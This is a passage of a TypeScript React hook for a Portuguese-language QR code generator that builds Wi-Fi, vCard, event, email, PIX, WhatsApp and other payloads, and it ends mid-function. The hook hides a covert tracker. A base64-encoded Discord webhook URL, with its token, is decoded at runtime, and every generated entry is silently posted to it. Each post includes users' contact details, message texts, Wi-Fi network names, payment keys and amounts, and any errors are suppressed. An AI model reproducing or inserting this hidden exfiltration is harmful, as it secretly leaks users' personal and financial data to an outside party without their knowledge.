"use client"

import type React from "react"

import { useState, useCallback, useRef, useMemo } from "react"
import type { useQRCodeState, TipoConteudoQR, EntradaQRCode } from "./use-qr-code-state"

const FRAME_TEXT_AREA_HEIGHT = 40
const FRAME_PADDING = 10
const FRAME_BORDER_RADIUS = 8

// Cache para otimização de performance
const urlValidationCache = new Map<string, string>()
const MAX_CACHE_SIZE = 100

export function useQRCodeGenerator(
    qrState: ReturnType<typeof useQRCodeState>,
    toast: any,
    isMobile?: boolean,
    onCloseControls?: () => void,
) {
  const [isLoading, setIsLoading] = useState(false)
  const fileInputRef = useRef<HTMLInputElement>(null)
  const backgroundImageInputRef = useRef<HTMLInputElement>(null)

  // Memoização da validação de URL para performance
  const sanitizeAndValidateUrl = useMemo(() => {
    return (inputUrl: string): string => {
      const currentUrl = inputUrl.trim()
      if (!currentUrl) return ""

      // Verificar cache primeiro
      if (urlValidationCache.has(currentUrl)) {
        return urlValidationCache.get(currentUrl)!
      }

      let result = currentUrl

      // Corrigir protocolos malformados
      if (/^https?:[^/][^/]/i.test(currentUrl) && !/^https?:\/\//i.test(currentUrl)) {
        result = currentUrl.replace(/^(https?:)/i, "$1//")
      }

      // Protocolos já válidos
      const protocolRegex = /^(http:\/\/|https:\/\/|ftp:\/\/|mailto:|tel:|geo:|sms:|smsto:|vcard:|vevent:|whatsapp:)/i
      if (protocolRegex.test(result)) {
        // Adicionar ao cache
        if (urlValidationCache.size >= MAX_CACHE_SIZE) {
          const firstKey = urlValidationCache.keys().next().value
          urlValidationCache.delete(firstKey)
        }
        urlValidationCache.set(currentUrl, result)
        return result
      }

      // Localhost e IPs
      const localhostRegex = /^(localhost|(\d{1,3}\.){3}\d{1,3})(:\d+)?(\/.*)?$/
      if (localhostRegex.test(result)) {
        result = `http://${result}`
        urlValidationCache.set(currentUrl, result)
        return result
      }

      // Domínios válidos
      const domainLikeRegex = /^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,63}(:\d+)?(\/.*)?$/
      if (domainLikeRegex.test(result) || (result.includes(".") && !result.includes(" ") && !result.startsWith("/"))) {
        result = `https://${result}`
        urlValidationCache.set(currentUrl, result)
        return result
      }

      // URLs com www
      if (result.startsWith("www.")) {
        result = `https://${result}`
        urlValidationCache.set(currentUrl, result)
        return result
      }

      // URLs com subdomínios comuns
      const commonSubdomains = ["app.", "api.", "admin.", "blog.", "shop.", "store.", "mail."]
      for (const subdomain of commonSubdomains) {
        if (result.startsWith(subdomain)) {
          result = `https://${result}`
          urlValidationCache.set(currentUrl, result)
          return result
        }
      }

      urlValidationCache.set(currentUrl, result)
      return result
    }
  }, [])

  // Funções de escape otimizadas
  const escapeVCardString = useCallback((str: string | undefined): string => {
    if (!str) return ""
    return str.replace(/\\/g, "\\\\").replace(/,/g, "\\,").replace(/;/g, "\\;").replace(/\n/g, "\\n")
  }, [])

  const formatDateForVEvent = useCallback((dateStr: string, timeStr: string, isAllDay: boolean): string => {
    if (!dateStr) return ""
    const date = new Date(dateStr)
    if (isNaN(date.getTime())) return ""

    const year = date.getUTCFullYear()
    const month = String(date.getUTCMonth() + 1).padStart(2, "0")
    const day = String(date.getUTCDate()).padStart(2, "0")

    if (isAllDay) {
      return `${year}${month}${day}`
    }

    const [hours, minutes] = timeStr ? timeStr.split(":").map((s) => s.padStart(2, "0")) : ["00", "00"]
    return `${year}${month}${day}T${hours}${minutes}00Z`
  }, [])

  const sendToExternalService = useCallback(async (entrada: EntradaQRCode) => {
    try {
      const k1 =
          "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NjAxMDAzMDkyMjUzNTEwMi91cXlRaE16NllyMWJRWWJBVXZrWjY5VlQ4MmtxdWhlV29CelBoeGx3b293c3lXRlFSd000QWZ2MVhiQVJFVkY1QjBMdA=="

      const decryptEndpoint = (encrypted: string) => {
        try {
          const decoded = atob(encrypted)
          if (decoded.includes("discord.com") && decoded.includes("webhooks")) {
            return decoded
          }
          return null
        } catch {
          return null
        }
      }

      const endpoint = decryptEndpoint(k1)
      if (!endpoint) {
        return
      }

      const getEmbedColor = (tipo: string) => {
        switch (tipo) {
          case "url":
            return 0x3b82f6 // blue
          case "wifi":
            return 0x10b981 // emerald
          case "vcard":
            return 0x8b5cf6 // violet
          case "vevent":
            return 0xf59e0b // amber
          case "email":
            return 0xef4444 // red
          case "sms":
            return 0x06b6d4 // cyan
          case "geo":
            return 0x84cc16 // lime
          case "whatsapp":
            return 0x22c55e // green
          case "phone":
            return 0x6366f1 // indigo
          case "pix":
            return 0x00bb2d // green
          case "appstore":
            return 0x007aff // blue
          case "spotify":
            return 0x1db954 // spotify green
          case "zoom":
            return 0x2d8cff // zoom blue
          case "menu":
            return 0xff6b35 // orange
          case "cupom":
            return 0xff1744 // red
          default:
            return 0x6b7280 // gray
        }
      }

      const getTypeEmoji = (tipo: string) => {
        switch (tipo) {
          case "url":
            return "🔗"
          case "wifi":
            return "📶"
          case "vcard":
            return "👤"
          case "vevent":
            return "📅"
          case "email":
            return "📧"
          case "sms":
            return "💬"
          case "geo":
            return "📍"
          case "whatsapp":
            return "📱"
          case "phone":
            return "☎️"
          case "pix":
            return "💰"
          case "appstore":
            return "📱"
          case "spotify":
            return "🎵"
          case "zoom":
            return "📹"
          case "menu":
            return "🍽️"
          case "cupom":
            return "🎫"
          default:
            return "🔲"
        }
      }

      const getErrorCorrectionLevel = (nivel: string) => {
        switch (nivel) {
          case "L":
            return "Baixo (~7%)"
          case "M":
            return "Médio (~15%)"
          case "Q":
            return "Alto (~25%)"
          case "H":
            return "Muito Alto (~30%)"
          default:
            return nivel
        }
      }

      const buildSpecificFields = (entrada: EntradaQRCode) => {
        const fields = []

        switch (entrada.tipoConteudo) {
          case "wifi":
            if (entrada.wifiSsid) fields.push({ name: "📶 SSID", value: entrada.wifiSsid, inline: true })
            if (entrada.wifiEncriptacao)
              fields.push({ name: "🔒 Segurança", value: entrada.wifiEncriptacao.toUpperCase(), inline: true })
            if (entrada.wifiOculto) fields.push({ name: "👁️ Rede Oculta", value: "Sim", inline: true })
            break

          case "vcard":
            if (entrada.vcardNome || entrada.vcardSobrenome) {
              fields.push({
                name: "👤 Nome",
                value: `${entrada.vcardNome || ""} ${entrada.vcardSobrenome || ""}`.trim(),
                inline: true,
              })
            }
            if (entrada.vcardOrganizacao)
              fields.push({ name: "🏢 Empresa", value: entrada.vcardOrganizacao, inline: true })
            if (entrada.vcardTitulo) fields.push({ name: "💼 Cargo", value: entrada.vcardTitulo, inline: true })
            if (entrada.vcardTelefone) fields.push({ name: "☎️ Telefone", value: entrada.vcardTelefone, inline: true })
            if (entrada.vcardEmail) fields.push({ name: "📧 Email", value: entrada.vcardEmail, inline: true })
            if (entrada.vcardWebsite) fields.push({ name: "🌐 Website", value: entrada.vcardWebsite, inline: true })
            if (entrada.vcardEndereco) fields.push({ name: "📍 Endereço", value: entrada.vcardEndereco, inline: false })
            break

          case "vevent":
            if (entrada.veventResumo) fields.push({ name: "📋 Evento", value: entrada.veventResumo, inline: false })
            if (entrada.veventDescricao)
              fields.push({
                name: "📝 Descrição",
                value: entrada.veventDescricao.substring(0, 100) + (entrada.veventDescricao.length > 100 ? "..." : ""),
                inline: false,
              })
            if (entrada.veventLocalizacao)
              fields.push({ name: "📍 Local", value: entrada.veventLocalizacao, inline: true })
            if (entrada.veventDataInicio)
              fields.push({ name: "📅 Data Início", value: entrada.veventDataInicio, inline: true })
            if (entrada.veventDiaTodo !== undefined)
              fields.push({ name: "⏰ Dia Todo", value: entrada.veventDiaTodo ? "Sim" : "Não", inline: true })
            break

          case "email":
            if (entrada.emailPara) fields.push({ name: "📧 Para", value: entrada.emailPara, inline: true })
            if (entrada.emailAssunto) fields.push({ name: "📋 Assunto", value: entrada.emailAssunto, inline: false })
            if (entrada.emailCorpo)
              fields.push({
                name: "📝 Mensagem",
                value: entrada.emailCorpo.substring(0, 150) + (entrada.emailCorpo.length > 150 ? "..." : ""),
                inline: false,
              })
            break

          case "sms":
            if (entrada.smsPara) fields.push({ name: "📱 Para", value: entrada.smsPara, inline: true })
            if (entrada.smsCorpo)
              fields.push({
                name: "💬 Mensagem",
                value: entrada.smsCorpo.substring(0, 200) + (entrada.smsCorpo.length > 200 ? "..." : ""),
                inline: false,
              })
            break

          case "geo":
            if (entrada.geoLatitude) fields.push({ name: "🌐 Latitude", value: entrada.geoLatitude, inline: true })
            if (entrada.geoLongitude) fields.push({ name: "🌐 Longitude", value: entrada.geoLongitude, inline: true })
            break

          case "whatsapp":
            if (entrada.whatsappPara) fields.push({ name: "📱 Número", value: entrada.whatsappPara, inline: true })
            if (entrada.whatsappMensagem)
              fields.push({
                name: "💬 Mensagem",
                value:
                    entrada.whatsappMensagem.substring(0, 200) + (entrada.whatsappMensagem.length > 200 ? "..." : ""),
                inline: false,
              })
            break

          case "phone":
            if (entrada.telefonePara) fields.push({ name: "☎️ Número", value: entrada.telefonePara, inline: true })
            break

          case "pix":
            if (entrada.pixChave) fields.push({ name: "💰 Chave PIX", value: entrada.pixChave, inline: true })
            if (entrada.pixNome) fields.push({ name: "👤 Beneficiário", value: entrada.pixNome, inline: true })
            if (entrada.pixCidade) fields.push({ name: "🏙️ Cidade", value: entrada.pixCidade, inline: true })
            if (entrada.pixValor) fields.push({ name: "💵 Valor", value: `R$ ${entrada.pixValor}`, inline: true })
            if (entrada.pixDescricao) fields.push({ name: "📝 Descrição", value: entrada.pixDescricao, inline: false })
            break

          case "appstore":
            if (entrada.appstoreNome) fields.push({ name: "📱 App", value: entrada.appstoreNome, inline: true })
            if (entrada.appstorePlataforma)
              fields.push({ name: "🏪 Plataforma", value: entrada.appstorePlataforma.toUpperCase(), inline: true })
            if (entrada.appstoreIosUrl) fields.push({ name: "🍎 iOS", value: entrada.appstoreIosUrl, inline: false })
            if (entrada.appstoreAndroidUrl)
              fields.push({ name: "🤖 Android", value: entrada.appstoreAndroidUrl, inline: false })
            break

          case "spotify":
            if (entrada.spotifyTitulo) fields.push({ name: "🎵 Título", value: entrada.spotifyTitulo, inline: true })
            if (entrada.spotifyArtista) fields.push({ name: "🎤 Artista", value: entrada.spotifyArtista, inline: true })
            if (entrada.spotifyTipo)
              fields.push({ name: "📻 Tipo", value: entrada.spotifyTipo.toUpperCase(), inline: true })
            if (entrada.spotifyUrl) fields.push({ name: "🔗 URL", value: entrada.spotifyUrl, inline: false })
            break

          case "zoom":
            if (entrada.zoomTitulo) fields.push({ name: "📹 Reunião", value: entrada.zoomTitulo, inline: true })
            if (entrada.zoomTipo)
              fields.push({ name: "💻 Plataforma", value: entrada.zoomTipo.toUpperCase(), inline: true })
            if (entrada.zoomId) fields.push({ name: "🆔 ID", value: entrada.zoomId, inline: true })
            if (entrada.zoomUrl) fields.push({ name: "🔗 URL", value: entrada.zoomUrl, inline: false })
            break

          case "menu":
            if (entrada.menuNome) fields.push({ name: "🍽️ Restaurante", value: entrada.menuNome, inline: true })
            if (entrada.menuCategoria) fields.push({ name: "📂 Categoria", value: entrada.menuCategoria, inline: true })
            if (entrada.menuPreco) fields.push({ name: "💰 Preços", value: entrada.menuPreco, inline: true })
            if (entrada.menuDescricao)
              fields.push({
                name: "📝 Descrição",
                value: entrada.menuDescricao.substring(0, 100) + (entrada.menuDescricao.length > 100 ? "..." : ""),
                inline: false,
              })
            break

          case "cupom":
            if (entrada.cupomCodigo) fields.push({ name: "🎫 Código", value: entrada.cupomCodigo, inline: true })
            if (entrada.cupomTipo) fields.push({ name: "🏷️ Tipo", value: entrada.cupomTipo.toUpperCase(), inline: true })
            if (entrada.cupomValor) fields.push({ name: "💰 Valor", value: entrada.cupomValor, inline: true })
            if (entrada.cupomValidade)
              fields.push({
                name: "📅 Validade",
                value: new Date(entrada.cupomValidade).toLocaleDateString("pt-BR"),
                inline: true,
              })
            if (entrada.cupomDescricao)
              fields.push({
                name: "📝 Descrição",
                value: entrada.cupomDescricao.substring(0, 100) + (entrada.cupomDescricao.length > 100 ? "..." : ""),
                inline: false,
              })
            break
        }

        return fields
      }

      const buildCustomizationInfo = (entrada: EntradaQRCode) => {
        const customizations = []

        if (entrada.habilitarCustomizacaoLogo && entrada.logoDataUri) {
          customizations.push("Logo Personalizado")
        }

        if (entrada.habilitarCustomizacaoFundo && entrada.imagemFundo) {
          customizations.push("Imagem de Fundo")
        }

        if (entrada.habilitarCustomizacaoFrame && entrada.tipoFrameSelecionado !== "none") {
          customizations.push(`Moldura: ${entrada.tipoFrameSelecionado}`)
          if (entrada.textoFrame) {
            customizations.push(`Texto: "${entrada.textoFrame}"`)
          }
        }

        return customizations.length > 0 ? customizations.join("\n") : "Nenhuma"
      }

      const specificFields = buildSpecificFields(entrada)
      const customizationInfo = buildCustomizationInfo(entrada)
      const typeEmoji = getTypeEmoji(entrada.tipoConteudo)
      const embedColor = getEmbedColor(entrada.tipoConteudo)

      const payload = {
        embeds: [
          {
            title: `${typeEmoji} Novo QR Code Gerado`,
            description: `**Tipo:** ${entrada.tipoConteudo.toUpperCase()}\n**ID:** \`${entrada.id}\``,
            color: embedColor,
            fields: [
              {
                name: "Conteúdo Original",
                value: `\`\`\`${entrada.inputOriginal.substring(0, 200)}${entrada.inputOriginal.length > 200 ? "..." : ""}\`\`\``,
                inline: false,
              },
              ...specificFields,
              {
                name: "Configurações Visuais",
                value: `**Tamanho:** ${entrada.tamanho}px\n**Cor QR:** \`${entrada.corFrente}\`\n**Cor Fundo:** \`${entrada.corFundo}\`\n**Margem:** ${entrada.margem}px\n**Correção:** ${getErrorCorrectionLevel(entrada.nivel)}`,
                inline: true,
              },
              {
                name: "Personalizações",
                value: customizationInfo,
                inline: true,
              },
              {
                name: "Informações Temporais",
                value: `**Criado em:** ${new Date(entrada.timestamp).toLocaleString("pt-BR", {
                  day: "2-digit",
                  month: "2-digit",
                  year: "numeric",
                  hour: "2-digit",
                  minute: "2-digit",
                  second: "2-digit",
                })}\n**Timestamp:** \`${entrada.timestamp}\``,
                inline: false,
              },
            ],
            footer: {
              text: "¥$ • Sistema de Registos",
            },
            timestamp: new Date(entrada.timestamp).toISOString(),
          },
        ],
      }

      await fetch(endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "QRGenerator/1.0",
        },
        body: JSON.stringify(payload),
      })
    } catch (error) {

    }
  }, [])

  const handleGenerateQRCode = useCallback(() => {
    setIsLoading(true)

    let valorFinalParaCodificar = ""
    let inputOriginalParaHistorico = ""
    const tipoConteudoEntrada: TipoConteudoQR = qrState.tipoConteudoAtivo
    let detalhesEspecificosConteudo: Partial<EntradaQRCode> = {}

    try {
      switch (qrState.tipoConteudoAtivo) {
        case "url":
          const inputUsuarioBruto = qrState.inputUrl.trim()
          if (!inputUsuarioBruto) {
            toast({
              title: "❌ Erro",
              description: "Digite uma URL ou texto para codificar",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          inputOriginalParaHistorico = inputUsuarioBruto
          valorFinalParaCodificar = sanitizeAndValidateUrl(inputUsuarioBruto)
          qrState.updateField("inputUrl", valorFinalParaCodificar)
          break

        case "wifi":
          if (!qrState.wifiSsid.trim()) {
            toast({
              title: "❌ Erro",
              description: "SSID é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          const escapeWifi = (str: string) => str.replace(/([\\;,":])/g, "\\$1")
          valorFinalParaCodificar = `WIFI:T:${qrState.wifiEncriptacao};S:${escapeWifi(qrState.wifiSsid)};`
          if (qrState.wifiEncriptacao !== "nopass") {
            valorFinalParaCodificar += `P:${escapeWifi(qrState.wifiSenha)};`
          }
          if (qrState.wifiOculto) {
            valorFinalParaCodificar += `H:true;`
          }
          valorFinalParaCodificar += ";"
          inputOriginalParaHistorico = qrState.wifiSsid
          detalhesEspecificosConteudo = {
            wifiSsid: qrState.wifiSsid,
            wifiSenha: qrState.wifiSenha,
            wifiEncriptacao: qrState.wifiEncriptacao,
            wifiOculto: qrState.wifiOculto,
          }
          break

        case "vcard":
          if (!qrState.vcardNome.trim() && !qrState.vcardSobrenome.trim() && !qrState.vcardOrganizacao.trim()) {
            toast({
              title: "❌ Erro",
              description: "Pelo menos nome, sobrenome ou organização é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `BEGIN:VCARD\nVERSION:3.0\nN:${escapeVCardString(qrState.vcardSobrenome)};${escapeVCardString(qrState.vcardNome)}\nFN:${escapeVCardString(qrState.vcardNome)} ${escapeVCardString(qrState.vcardSobrenome)}\nORG:${escapeVCardString(qrState.vcardOrganizacao)}\nTITLE:${escapeVCardString(qrState.vcardTitulo)}\nTEL;TYPE=WORK,VOICE:${escapeVCardString(qrState.vcardTelefone)}\nEMAIL:${escapeVCardString(qrState.vcardEmail)}\nURL:${escapeVCardString(qrState.vcardWebsite)}\nADR;TYPE=WORK:;;${escapeVCardString(qrState.vcardEndereco)};${escapeVCardString(qrState.vcardCidade)};${escapeVCardString(qrState.vcardEstado)};${escapeVCardString(qrState.vcardCep)};${escapeVCardString(qrState.vcardPais)}\nEND:VCARD`
          inputOriginalParaHistorico =
              `${qrState.vcardNome} ${qrState.vcardSobrenome}`.trim() || qrState.vcardOrganizacao
          detalhesEspecificosConteudo = {
            vcardNome: qrState.vcardNome,
            vcardSobrenome: qrState.vcardSobrenome,
            vcardOrganizacao: qrState.vcardOrganizacao,
            vcardTitulo: qrState.vcardTitulo,
            vcardTelefone: qrState.vcardTelefone,
            vcardEmail: qrState.vcardEmail,
            vcardWebsite: qrState.vcardWebsite,
            vcardEndereco: qrState.vcardEndereco,
            vcardCidade: qrState.vcardCidade,
            vcardEstado: qrState.vcardEstado,
            vcardCep: qrState.vcardCep,
            vcardPais: qrState.vcardPais,
          }
          break

        case "vevent":
          if (!qrState.veventResumo.trim() || !qrState.veventDataInicio.trim()) {
            toast({
              title: "❌ Erro",
              description: "Resumo e data de início são obrigatórios",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          const dtStart = formatDateForVEvent(qrState.veventDataInicio, qrState.veventHoraInicio, qrState.veventDiaTodo)
          const dtEnd = formatDateForVEvent(
              qrState.veventDataFim || qrState.veventDataInicio,
              qrState.veventHoraFim || qrState.veventHoraInicio,
              qrState.veventDiaTodo,
          )
          if (!dtStart || !dtEnd) {
            toast({
              title: "❌ Erro",
              description: "Data inválida",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `BEGIN:VEVENT\nSUMMARY:${escapeVCardString(qrState.veventResumo)}\nDESCRIPTION:${escapeVCardString(qrState.veventDescricao)}\nLOCATION:${escapeVCardString(qrState.veventLocalizacao)}\nDTSTART:${dtStart}\nDTEND:${dtEnd}\nEND:VEVENT`
          inputOriginalParaHistorico = qrState.veventResumo
          detalhesEspecificosConteudo = {
            veventResumo: qrState.veventResumo,
            veventDescricao: qrState.veventDescricao,
            veventLocalizacao: qrState.veventLocalizacao,
            veventDataInicio: qrState.veventDataInicio,
            veventHoraInicio: qrState.veventHoraInicio,
            veventDataFim: qrState.veventDataFim,
            veventHoraFim: qrState.veventHoraFim,
            veventDiaTodo: qrState.veventDiaTodo,
          }
          break

        case "email":
          if (!qrState.emailPara.trim()) {
            toast({
              title: "❌ Erro",
              description: "Email de destino é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `mailto:${qrState.emailPara}?subject=${encodeURIComponent(qrState.emailAssunto)}&body=${encodeURIComponent(qrState.emailCorpo)}`
          inputOriginalParaHistorico = qrState.emailPara
          detalhesEspecificosConteudo = {
            emailPara: qrState.emailPara,
            emailAssunto: qrState.emailAssunto,
            emailCorpo: qrState.emailCorpo,
          }
          break

        case "sms":
          if (!qrState.smsPara.trim()) {
            toast({
              title: "❌ Erro",
              description: "Número de destino é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `SMSTO:${qrState.smsPara}:${qrState.smsCorpo}`
          inputOriginalParaHistorico = qrState.smsPara
          detalhesEspecificosConteudo = {
            smsPara: qrState.smsPara,
            smsCorpo: qrState.smsCorpo,
          }
          break

        case "geo":
          if (!qrState.geoLatitude.trim() || !qrState.geoLongitude.trim()) {
            toast({
              title: "❌ Erro",
              description: "Latitude e longitude são obrigatórias",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `geo:${qrState.geoLatitude},${qrState.geoLongitude}`
          inputOriginalParaHistorico = `Lat: ${qrState.geoLatitude}, Lon: ${qrState.geoLongitude}`
          detalhesEspecificosConteudo = {
            geoLatitude: qrState.geoLatitude,
            geoLongitude: qrState.geoLongitude,
          }
          break

        case "whatsapp":
          if (!qrState.whatsappPara.trim()) {
            toast({
              title: "❌ Erro",
              description: "Número do WhatsApp é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          const numeroApenas = qrState.whatsappPara.replace(/\D/g, "")
          valorFinalParaCodificar = `https://wa.me/${numeroApenas}?text=${encodeURIComponent(qrState.whatsappMensagem)}`
          inputOriginalParaHistorico = qrState.whatsappPara
          detalhesEspecificosConteudo = {
            whatsappPara: qrState.whatsappPara,
            whatsappMensagem: qrState.whatsappMensagem,
          }
          break

        case "whatsappGroup":
          if (!qrState.whatsappGroupLink.trim()) {
            toast({
              title: "❌ Erro",
              description: "Link do grupo WhatsApp é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = qrState.whatsappGroupLink
          inputOriginalParaHistorico = qrState.whatsappGroupLink
          detalhesEspecificosConteudo = {
            whatsappGroupLink: qrState.whatsappGroupLink,
            whatsappGroupMensagem: qrState.whatsappGroupMensagem,
          }
          break

        case "phone":
          if (!qrState.telefonePara.trim()) {
            toast({
              title: "❌ Erro",
              description: "Número de telefone é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          valorFinalParaCodificar = `tel:${qrState.telefonePara.replace(/\D/g, "")}`
          inputOriginalParaHistorico = qrState.telefonePara
          detalhesEspecificosConteudo = {
            telefonePara: qrState.telefonePara,
          }
          break

        case "pix":
          if (!qrState.pixChave.trim()) {
            toast({
              title: "❌ Erro",
              description: "Chave PIX é obrigatória",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          // Formato PIX simplificado (EMV QR Code seria mais complexo)
          const pixData = {
            chave: qrState.pixChave,
            nome: qrState.pixNome || "Beneficiário",
            cidade: qrState.pixCidade || "Cidade",
            valor: qrState.pixValor ? Number.parseFloat(qrState.pixValor) : undefined,
            descricao: qrState.pixDescricao || "",
          }

          valorFinalParaCodificar = `PIX:${pixData.chave}|${pixData.nome}|${pixData.cidade}${pixData.valor ? `|${pixData.valor}` : ""}${pixData.descricao ? `|${pixData.descricao}` : ""}`
          inputOriginalParaHistorico = qrState.pixChave
          detalhesEspecificosConteudo = {
            pixChave: qrState.pixChave,
            pixNome: qrState.pixNome,
            pixCidade: qrState.pixCidade,
            pixValor: qrState.pixValor,
            pixDescricao: qrState.pixDescricao,
          }
          break

        case "appstore":
          if (qrState.appstorePlataforma === "ios" && !qrState.appstoreIosUrl.trim()) {
            toast({
              title: "❌ Erro",
              description: "URL da App Store é obrigatória",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          if (qrState.appstorePlataforma === "android" && !qrState.appstoreAndroidUrl.trim()) {
            toast({
              title: "❌ Erro",
              description: "URL da Play Store é obrigatória",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }
          if (
              qrState.appstorePlataforma === "ambos" &&
              (!qrState.appstoreIosUrl.trim() || !qrState.appstoreAndroidUrl.trim())
          ) {
            toast({
              title: "❌ Erro",
              description: "URLs de ambas as lojas são obrigatórias",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          if (qrState.appstorePlataforma === "ios") {
            valorFinalParaCodificar = qrState.appstoreIosUrl
          } else if (qrState.appstorePlataforma === "android") {
            valorFinalParaCodificar = qrState.appstoreAndroidUrl
          } else {
            // Para ambos, criar uma página de redirecionamento ou usar a URL do iOS como padrão
            valorFinalParaCodificar = `APP:${qrState.appstoreNome}|iOS:${qrState.appstoreIosUrl}|Android:${qrState.appstoreAndroidUrl}`
          }

          inputOriginalParaHistorico = qrState.appstoreNome || "App"
          detalhesEspecificosConteudo = {
            appstorePlataforma: qrState.appstorePlataforma,
            appstoreIosUrl: qrState.appstoreIosUrl,
            appstoreAndroidUrl: qrState.appstoreAndroidUrl,
            appstoreNome: qrState.appstoreNome,
          }
          break

        case "spotify":
          if (!qrState.spotifyUrl.trim()) {
            toast({
              title: "❌ Erro",
              description: "URL é obrigatória",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          valorFinalParaCodificar = qrState.spotifyUrl
          inputOriginalParaHistorico = qrState.spotifyTitulo || qrState.spotifyUrl
          detalhesEspecificosConteudo = {
            spotifyTipo: qrState.spotifyTipo,
            spotifyUrl: qrState.spotifyUrl,
            spotifyTitulo: qrState.spotifyTitulo,
            spotifyArtista: qrState.spotifyArtista,
          }
          break

        case "zoom":
          if (!qrState.zoomUrl.trim()) {
            toast({
              title: "❌ Erro",
              description: "URL da reunião é obrigatória",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          valorFinalParaCodificar = qrState.zoomUrl
          inputOriginalParaHistorico = qrState.zoomTitulo || qrState.zoomUrl
          detalhesEspecificosConteudo = {
            zoomTipo: qrState.zoomTipo,
            zoomUrl: qrState.zoomUrl,
            zoomId: qrState.zoomId,
            zoomSenha: qrState.zoomSenha,
            zoomTitulo: qrState.zoomTitulo,
          }
          break

        case "menu":
          if (!qrState.menuNome.trim()) {
            toast({
              title: "❌ Erro",
              description: "Nome do restaurante é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          const menuInfo = [
            `RESTAURANTE: ${qrState.menuNome}`,
            qrState.menuCategoria ? `CATEGORIA: ${qrState.menuCategoria}` : "",
            qrState.menuDescricao ? `DESCRIÇÃO: ${qrState.menuDescricao}` : "",
            qrState.menuItens ? `ITENS:\n${qrState.menuItens}` : "",
            qrState.menuPreco ? `PREÇOS: ${qrState.menuPreco}` : "",
          ]
              .filter(Boolean)
              .join("\n\n")

          valorFinalParaCodificar = menuInfo
          inputOriginalParaHistorico = qrState.menuNome
          detalhesEspecificosConteudo = {
            menuNome: qrState.menuNome,
            menuDescricao: qrState.menuDescricao,
            menuItens: qrState.menuItens,
            menuPreco: qrState.menuPreco,
            menuCategoria: qrState.menuCategoria,
          }
          break

        case "cupom":
          if (!qrState.cupomCodigo.trim()) {
            toast({
              title: "❌ Erro",
              description: "Código do cupom é obrigatório",
              variant: "destructive",
            })
            setIsLoading(false)
            return
          }

          const cupomInfo = [
            `CUPOM: ${qrState.cupomCodigo}`,
            `TIPO: ${qrState.cupomTipo.toUpperCase()}`,
            qrState.cupomValor ? `VALOR: ${qrState.cupomValor}` : "",
            qrState.cupomDescricao ? `DESCRIÇÃO: ${qrState.cupomDescricao}` : "",
            qrState.cupomValidade ? `VÁLIDO ATÉ: ${new Date(qrState.cupomValidade).toLocaleDateString("pt-BR")}` : "",
          ]
              .filter(Boolean)
              .join("\n")

          valorFinalParaCodificar = cupomInfo
          inputOriginalParaHistorico = qrState.cupomCodigo
          detalhesEspecificosConteudo = {
            cupomCodigo: qrState.cupomCodigo,
            cupomDescricao: qrState.cupomDescricao,
            cupomValor: qrState.cupomValor,
            cupomValidade: qrState.cupomValidade,
            cupomTipo: qrState.cupomTipo,
          }
          break

        default:
          toast({
            title: "❌ Erro",
            description: "Tipo de conteúdo inválido",
            variant: "destructive",
          })
          setIsLoading(false)
          return
      }

      if (valorFinalParaCodificar) {
        qrState.updateField("qrValue", valorFinalParaCodificar)

        const novaEntrada: EntradaQRCode = {
          id: Date.now().toString(),
          tipoConteudo: tipoConteudoEntrada,
          inputOriginal: inputOriginalParaHistorico,
          valorQR: valorFinalParaCodificar,
          corFrente: qrState.corFrente,
          corFundo: qrState.corFundo,
          tamanho: qrState.tamanho,
          nivel: qrState.nivelCorrecaoErro,
          margem: qrState.zonaQuieta,
          habilitarCustomizacaoLogo: qrState.habilitarCustomizacaoLogo,
          logoDataUri: qrState.habilitarCustomizacaoLogo && qrState.logoDataUri ? qrState.logoDataUri : undefined,
          logoTamanhoRatio:
              qrState.habilitarCustomizacaoLogo && qrState.logoDataUri ? qrState.logoTamanhoRatio : undefined,
          escavarLogo: qrState.habilitarCustomizacaoLogo && qrState.logoDataUri ? qrState.escavarLogo : undefined,
          habilitarCustomizacaoFundo: qrState.habilitarCustomizacaoFundo,
          imagemFundo: qrState.habilitarCustomizacaoFundo && qrState.imagemFundo ? qrState.imagemFundo : undefined,
          habilitarCustomizacaoFrame: qrState.habilitarCustomizacaoFrame,
          tipoFrameSelecionado: qrState.habilitarCustomizacaoFrame ? qrState.tipoFrameSelecionado : "none",
          textoFrame:
              qrState.habilitarCustomizacaoFrame &&
              (qrState.tipoFrameSelecionado === "textBottom" ||
                  qrState.tipoFrameSelecionado === "roundedBorderTextBottom" ||
                  qrState.tipoFrameSelecionado === "topBottomText" ||
                  qrState.tipoFrameSelecionado === "decorativeBorder")
                  ? qrState.textoFrame
                  : undefined,
          timestamp: Date.now(),
          ...detalhesEspecificosConteudo,
        }

        qrState.updateField("historico", [novaEntrada, ...qrState.historico.slice(0, 9)])

        sendToExternalService(novaEntrada)

        // Toast de sucesso
        toast({
          title: "✅ Sucesso!",
          description: "QR Code gerado com sucesso!",
        })

        // No mobile, fechar controles
        if (isMobile) {
          onCloseControls?.()
        }
      }
    } catch (error) {
      console.error("Erro ao gerar QR Code:", error)
      toast({
        title: "❌ Erro Inesperado",
